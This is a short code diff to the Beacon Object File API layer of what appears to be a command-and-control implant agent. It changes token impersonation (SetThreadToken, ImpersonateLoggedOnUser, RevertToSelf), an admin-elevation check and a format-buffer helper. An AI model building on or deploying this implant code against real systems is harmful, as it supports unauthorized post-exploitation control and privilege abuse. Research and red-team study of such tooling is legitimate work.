@@ -7,6 +7,8 @@ Packer* bofOutputPacker = NULL;
 int     bofOutputCount  = 0;
 ULONG   bofTaskId       = 0;
 
+ULONG bofImpersonate = 1;
+
 void BofOutputToTask(int type, PBYTE data, int dataSize)
 {
 	if (bofOutputPacker) {
@@ -181,7 +183,12 @@ void BeaconFormatPrintf(formatp* format, const char* fmt, ...)
 
 char* BeaconFormatToString(formatp* format, int* size)
 {
-	*size = format->length;
+	if(size != NULL)
+		*size = format->length;
+
+	format->buffer[0] = '\0';
+	format->buffer += 1;
+	format->length += 1;
 	return format->original;
 }
 
@@ -218,25 +225,23 @@ void BeaconFormatInt(formatp* format, int value)
 
 BOOL BeaconUseToken(HANDLE token)
 {
-	if (ApiWin->ImpersonateLoggedOnUser(token))
+	if (ApiWin->SetThreadToken(NULL, token) || ApiWin->ImpersonateLoggedOnUser(token) ) {
+		bofImpersonate = 2;
 		return TRUE;
-	else if (ApiWin->SetThreadToken(NULL, token))
-		return TRUE;
-	else
-		return FALSE;
+	}
+	return FALSE;
 }
 
 void BeaconRevertToken(void)
 {
 	ApiWin->RevertToSelf();
-	return;
+	bofImpersonate = 0;
 }
 
 BOOL BeaconIsAdmin(void)
 {
-	HANDLE Token = { 0 };
-	BOOL   Admin = FALSE;
-	return Admin;
+	BOOL high = IsElevate();
+	return high;
 }
 
 void BeaconGetSpawnTo(BOOL x86, char* buffer, int length)
